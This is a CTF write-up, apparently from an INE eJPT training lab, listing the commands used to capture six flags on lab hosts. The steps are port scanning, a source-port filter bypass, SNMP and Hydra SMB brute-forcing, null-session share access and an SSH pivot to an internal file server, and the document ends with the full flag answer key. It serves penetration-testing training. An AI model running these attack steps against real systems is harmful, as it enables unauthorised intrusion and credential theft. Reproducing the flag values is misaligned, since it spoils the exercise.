# Command Reference: Host & Network Penetration Testing â€“ Network-Based Attacks CTF 1

This document provides a consolidated, categorized technical reference of all offensive commands executed during the **INE eJPT Host & Network Penetration Testing: Network-Based Attacks CTF 1** assessment. All commands are directly evidenced by terminal captures and logs generated throughout the engagement.

---

## 1. Network Reconnaissance & Port Scanning

### Full TCP Port Scan with Service Detection
```bash
nmap -p- -sV 192.182.208.3
```
- **What it does**: Scans all 65,535 TCP ports (`-p-`) on target host `192.182.208.3` (`target1.ine.local`) and probes open ports to determine service and version details (`-sV`).
- **Why it is used**: Identifies the perimeter host's exposed attack surface, revealing standard services and unusual listening daemons.
- **Key Options Explained**:
  - `-p-`: Scans the entire 16-bit port range (ports 1 through 65535).
  - `-sV`: Performs banner grabbing and version detection against open ports.
- **Observed Result**: Identified open ports 22/tcp (OpenSSH 9.6p1), 139/tcp (Samba smbd 3.Xâ€“4.X), 199/tcp (smux), 445/tcp (Samba smbd 3.Xâ€“4.X), and an unrecognized high port 13337/tcp. Nmap service probe on 13337 returned: `NETDIAG: access denied (diagnostic channel expects mgmt source port)`.
- **Screenshot Reference**: `02-nmap-tcp-port-scan.png` (Screenshot 02).

---

## 2. Source Port Manipulation & Diagnostic Service Bypass (Flag 1)

### Filtered Diagnostic Port Connection via Privileged Source Port
```bash
ncat -p 53 192.182.208.3 13337
```
- **What it does**: Connects to the filtered diagnostic service on port 13337 using fixed client source port 53 (DNS traffic port).
- **Why it is used**: Bypasses perimeter packet filters or application-level source port restrictions configured to accept connections only from low-numbered management ports.
- **Key Options Explained**:
  - `-p 53`: Binds the outbound socket to source port 53 rather than an ephemeral high-numbered client port.
- **Observed Result**: Successfully bypassed filtering, triggering the service banner:
  ```text
  ASHCROFT-LOGISTICS NETDIAG v2.1
  ---------------------------------
  link: UP   mtu: 1500   mgmt: SNMP(v1) enabled on this host
  diagnostic token: Flag1_36b0445d522a4016b2a9ffb549134267
  ```
- **Intelligence Harvested**: Recovered Flag 1 and established that SNMP management is active on `target1.ine.local`.
- **Screenshot Reference**: `03-flag1-diagnostic-service-source-port-bypass.png` (Screenshot 03).

---

## 3. SNMP Enumeration & Community String Brute-Force (Flag 2)

### Targeted UDP SNMP Service Scan
```bash
nmap -sU -sV -p 161 target1.ine.local
```
- **What it does**: Sends UDP probes to port 161 on `target1.ine.local` with service version detection.
- **Why it is used**: Confirms whether the Simple Network Management Protocol (SNMP) daemon is actively listening.
- **Observed Result**: Confirmed `161/udp open snmp` running `net-snmp; net-snmp SNMPv3 server` (supporting v1/v2c backward compatibility).
- **Screenshot Reference**: `04-snmp-port-scan-and-community-bruteforce.png` (Screenshot 04).

### SNMP Community String Brute-Force Attack
```bash
nmap -sU -p 161 --script snmp-brute target1.ine.local
```
- **What it does**: Executes Nmap's automated `snmp-brute` script against UDP port 161 to test common SNMP community strings.
- **Why it is used**: Identifies valid read-only or read-write community strings protecting the host's SNMP MIB hierarchy.
- **Observed Result**: Successfully cracked the community string:
  ```text
  PORT    STATE SERVICE
  161/udp open  snmp
  | snmp-brute:
  |_  mngt - Valid credentials
  ```
- **Screenshot Reference**: `04-snmp-port-scan-and-community-bruteforce.png` (Screenshot 04).

### Full SNMP MIB Tree Walk Output Redirection
```bash
snmpwalk -v2c -c mngt target1.ine.local > snmp.txt
```
- **What it does**: Walks the entire SNMP Management Information Base (MIB) tree using SNMP protocol version 2c (`-v2c`) and community string `mngt` (`-c mngt`), saving all returned OIDs and values to `snmp.txt`.
- **Why it is used**: Collects system configuration, software inventory, active processes, and custom OID values for offline analysis.
- **Screenshot Reference**: `04-snmp-port-scan-and-community-bruteforce.png` (Screenshot 04).

### Querying Custom OIDs for Embedded Flag Strings
```bash
snmpwalk -v2c -c mngt -On target1.ine.local .1 | grep -i flag
```
- **What it does**: Walks the root `.1` OID hierarchy displaying numeric OIDs (`-On`) and filters the output for lines matching `flag`.
- **Why it is used**: Quickly isolates custom administrative extensions or hidden strings exposed via SNMP.
- **Observed Result**:
  ```text
  .1.3.6.1.4.1.8072.1.3.2.2.1.3.4.100.105.97.103 = STRING: "/etc/snmp/.flag2"
  .1.3.6.1.4.1.8072.1.3.2.3.1.1.4.100.105.97.103 = STRING: "Flag2_d8644705c2b44db4afd72e233835742a"
  .1.3.6.1.4.1.8072.1.3.2.3.1.2.4.100.105.97.103 = STRING: "Flag2_d8644705c2b44db4afd72e233835742a"
  .1.3.6.1.4.1.8072.1.3.2.4.1.2.4.100.105.97.103.1 = STRING: "Flag2_d8644705c2b44db4afd72e233835742a"
  ```
- **Screenshot Reference**: `05-flag2-snmpwalk-oid-enumeration.png` (Screenshot 05).

---

## 4. Unauthenticated SMB Enumeration & Public Share Access (Flag 3)

### Null-Session SMB Share Listing
```bash
smbclient -L target1.ine.local -N
```
- **What it does**: Interrogates the SMB service on `target1.ine.local` for shared resources using an anonymous null session (`-N`).
- **Why it is used**: Discovers accessible shares and workgroup metadata without providing user credentials.
- **Observed Result**: Identified shares `public` (`Public Staff Notices`), `backup` (`Backup Operators Only`), and `IPC$`. Workgroup: `ASHCROFT`, Master Browser: `FILE02`.
- **Screenshot Reference**: `06-smb-unauthenticated-share-enumeration.png` (Screenshot 06).

### Accessing Unauthenticated `public` Share
```bash
smbclient -N //target1.ine.local/public
```
- **What it does**: Establishes an anonymous SMB session to the `public` share.
- **Interactive SMB Client Commands**:
  ```text
  smb: \> ls
  smb: \> get notice_to_staff.txt
  ```
- **Observed Result**: Downloaded `notice_to_staff.txt` (325 bytes).
- **Screenshot Reference**: `07-flag3-public-share-file-retrieval.png` (Screenshot 07).

### Extracting Flag 3 and Operational Clues
```bash
cat notice_to_staff.txt
```
- **What it does**: Reads the downloaded staff notice.
- **Observed Result**:
  ```text
  ASHCROFT LOGISTICS - STAFF NOTICE (PUBLIC)
  ===========================================
  Reminder: the general 'public' share is world-readable. Do NOT place
  sensitive files here. Backup Operators: use the restricted 'backup'
  share (credentialed access only).

  Perimeter self-check token: Flag3_5ee56c901a7f4754bc7d4f2ab3a7a927
  ```
- **Screenshot Reference**: `07-flag3-public-share-file-retrieval.png` (Screenshot 07).

---

## 5. User Enumeration & SMB Password Brute-Force (Flag 4)

### Comprehensive SMB & Samba Enumeration via Enum4linux
```bash
enum4linux -a target1.ine.local
```
- **What it does**: Executes automated SMB reconnaissance including workgroup extraction, OS fingerprinting, share listing, password policy checks, and user RID cycling.
- **Why it is used**: Identifies valid domain and local user accounts configured on the Samba daemon.
- **Observed Result**: Enumerated local user accounts via SID `S-1-22-1`:
  - `S-1-22-1-1000 Unix User\ubuntu`
  - `S-1-22-1-1001 Unix User\svc_netdiag`
  - `S-1-22-1-1002 Unix User\smbpublic`
  - `S-1-22-1-1003 Unix User\svc_backup`
- **Screenshots Reference**: `08-enum4linux-target-and-workgroup-info.png` (Screenshot 08) and `09-enum4linux-user-enumeration-svc-backup.png` (Screenshot 09).

### Online Dictionary Attack against SMB User `svc_backup`
```bash
hydra -l svc_backup -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 1 smb://target1.ine.local
```
- **What it does**: Conducts an online dictionary attack using Hydra against SMB port 445 on `target1.ine.local` targeting user `svc_backup` using `unix_passwords.txt`.
- **Why it is used**: Tests for weak passwords on the service account associated with the restricted `backup` share.
- **Key Options Explained**:
  - `-l svc_backup`: Specifies single target username.
  - `-P .../unix_passwords.txt`: Points to dictionary candidate list (1,009 passwords).
  - `-t 1`: Limits parallel connection threads to 1 to avoid connection drops.
  - `smb://target1.ine.local`: Specifies target protocol and hostname.
- **Observed Result**: Successfully cracked password in 1 second:
  ```text
  [445][smb] host: target1.ine.local   login: svc_backup   password: [REDACTED]
  1 of 1 target successfully completed, 1 valid password found
  ```
- **Screenshot Reference**: `10-hydra-smb-password-bruteforce-svc-backup.png` (Screenshot 10).

### Authenticated Access to Restricted `backup` Share
```bash
smbclient //target1.ine.local/backup -U svc_backup
```
- **What it does**: Authenticates to the restricted `backup` share as user `svc_backup` using the cracked password `[REDACTED]`.
- **Interactive SMB Client Commands**:
  ```text
  smb: \> ls
  smb: \> get backup_notes.txt
  ```
- **Observed Result**: Downloaded `backup_notes.txt` (462 bytes).
- **Screenshot Reference**: `11-flag4-authenticated-backup-share-retrieval.png` (Screenshot 11).

### Reading Backup Operations Notes
```bash
cat backup_notes.txt
```
- **What it does**: Inspects downloaded backup operations documentation.
- **Observed Result**:
  ```text
  ASHCROFT LOGISTICS - BACKUP OPERATIONS (RESTRICTED)
  ===================================================
  Backup token: Flag4_332c5932fc77447790ece3a3125aa077

  Internal targets reached from this host during nightly jobs:
    FILE02  target2.ine.local
  ```
- **Screenshot Reference**: `11-flag4-authenticated-backup-share-retrieval.png` (Screenshot 11).

---

## 6. Host Pivot & Internal File Server Exploitation (Flag 5)

### Establishing SSH Pivot Session into `target1`
```bash
# Executed from Kali Workstation to gain shell on perimeter host
ssh svc_backup@target1.ine.local
```
- **What it does**: Connects via SSH to `target1.ine.local` using compromised credentials `svc_backup:[REDACTED]`.
- **Why it is used**: Establishes an interactive execution context on the perimeter host to reach the isolated internal network segment.
- **Observed Prompt**: `svc_backup@target1:~$`
- **Screenshot Reference**: `12-pivot-host-ssh-and-internal-share-enumeration.png` (Screenshot 12).

### Verifying Tool Availability & Enumerating Internal Shares on `target2`
```bash
# Attempted Nmap scan (returned command not found)
svc_backup@target1:~$ nmap -sV -p- target2.ine.local

# Enumerating SMB shares on internal host target2.ine.local
svc_backup@target1:~$ smbclient -L target2.ine.local -N
```
- **What it does**: Tests for local scanning tools (Nmap unavailable) and falls back to native `smbclient` to enumerate shares on internal host `target2.ine.local` via anonymous session.
- **Why it is used**: Interrogates internal target `target2.ine.local` (`FILE02`) from the authorized perimeter pivot point.
- **Observed Result**: Identified shares `dropbox` (`Internal Dropbox`), `sql-backups` (`SQL Backups (Restricted)`), and `IPC$`.
- **Screenshot Reference**: `12-pivot-host-ssh-and-internal-share-enumeration.png` (Screenshot 12).

### Accessing Internal Unauthenticated `dropbox` Share
```bash
svc_backup@target1:~$ smbclient -N //target2.ine.local/dropbox
```
- **What it does**: Connects anonymously to the internal `dropbox` share from `target1`.
- **Interactive SMB Client Commands**:
  ```text
  smb: \> ls
  smb: \> get README.txt
  smb: \> exit
  ```
- **Observed Result**: Downloaded `README.txt` (330 bytes).
- **Screenshot Reference**: `13-internal-dropbox-share-download.png` (Screenshot 13).

### Extracting Flag 5 & Database Administrative Credentials
```bash
svc_backup@target1:~$ cat README.txt
```
- **What it does**: Displays the contents of `README.txt` retrieved from the internal dropbox.
- **Observed Result**:
  ```text
  FILE02 - DROPBOX (internal, guest-readable)
  ===========================================
  Temporary drop location for the internal segment.

  Internal token: Flag5_acecee2873d74e099d60dbf2ad27946d

  DB maintenance (do not distribute):
    restricted share : sql-backups
    account          : db_admin
    password         : [REDACTED]
  ```
- **Screenshot Reference**: `14-flag5-internal-token-and-db-creds.png` (Screenshot 14).

---

## 7. Authenticated Internal Share Compromise (Flag 6)

### Accessing Restricted `sql-backups` Share as `db_admin`
```bash
svc_backup@target1:~$ smbclient //target2.ine.local/sql-backups -U db_admin
```
- **What it does**: Authenticates to restricted internal share `sql-backups` on `target2.ine.local` as `db_admin` using the discovered plaintext maintenance password `[REDACTED]`.
- **Interactive SMB Client Commands**:
  ```text
  smb: \> ls
  smb: \> get db_export.txt
  smb: \> ^Z
  ```
- **Observed Result**: Downloaded `db_export.txt` (170 bytes).
- **Screenshot Reference**: `15-flag6-restricted-database-share-retrieval.png` (Screenshot 15).

### Extracting Flag 6 from Database Export
```bash
svc_backup@target1:~$ cat db_export.txt
```
- **What it does**: Displays the contents of the recovered database export file.
- **Observed Result**:
  ```text
  FILE02 - SQL BACKUPS (RESTRICTED, db_admin only)
  =================================================
  Database export integrity token: Flag6_42e42cb3a46f42ff9d1f0407b329a328
  ```
- **Screenshot Reference**: `15-flag6-restricted-database-share-retrieval.png` (Screenshot 15).

---

## 8. Summary of Verified Flag Values

| Flag | Target System | Service & Protocol | Extraction Vector / Artifact | Verified Flag Value | Status |
| :---: | :---: | :--- | :--- | :--- | :---: |
| **Flag 1** | `target1.ine.local` | TCP 13337 (NETDIAG) | Source Port Manipulation (`ncat -p 53`) | `Flag1_36b0445d522a4016b2a9ffb549134267` | Visually Verified |
| **Flag 2** | `target1.ine.local` | UDP 161 (SNMP) | MIB OID Walk (`snmpwalk -v2c -c mngt`) | `Flag2_d8644705c2b44db4afd72e233835742a` | Visually Verified |
| **Flag 3** | `target1.ine.local` | TCP 445 (SMB) | Unauthenticated Share `//target1/public` (`notice_to_staff.txt`) | `Flag3_5ee56c901a7f4754bc7d4f2ab3a7a927` | Visually Verified |
| **Flag 4** | `target1.ine.local` | TCP 445 (SMB) | Authenticated Share `//target1/backup` (`backup_notes.txt`) | `Flag4_332c5932fc77447790ece3a3125aa077` | Visually Verified |
| **Flag 5** | `target2.ine.local` | TCP 445 (SMB via Pivot) | Unauthenticated Share `//target2/dropbox` (`README.txt`) | `Flag5_acecee2873d74e099d60dbf2ad27946d` | Visually Verified |
| **Flag 6** | `target2.ine.local` | TCP 445 (SMB via Pivot) | Authenticated Share `//target2/sql-backups` (`db_export.txt`) | `Flag6_42e42cb3a46f42ff9d1f0407b329a328` | Visually Verified |
